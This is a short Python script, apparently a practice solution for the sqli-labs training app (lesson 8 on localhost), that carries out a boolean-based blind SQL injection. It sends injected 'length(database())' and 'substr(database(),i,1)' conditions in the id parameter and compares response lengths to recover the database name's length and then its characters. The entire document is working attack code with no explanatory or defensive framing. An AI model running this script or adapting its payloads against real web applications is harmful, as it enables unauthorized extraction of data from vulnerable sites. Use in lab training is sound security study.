import requests
import string
url = 'http://localhost/sqli-labs/Less-8/index.php'
normalLen = len( requests.get(url = url + "?id=1").text )
print(normalLen)
dbLen = 0
while True:
    dburl = url + "?id=1'+and+length(database())="+str(dbLen) + "--+"
    # print(dburl)
    newLen = len(requests.get(url = dburl).text)
    if newLen == normalLen:
        print(dbLen)
        break
    dbLen += 1
dbname = ''
for i in range(1, dbLen+1):
    for char in string.ascii_lowercase:
        dburl =  url + "?id=1'+and+substr(database(),"+str(i)+", 1)='"+ char + "'--+"
        newLen =  len(requests.get(url = dburl).text)
        if newLen == normalLen:
            dbname += char
            print(dbname)
            break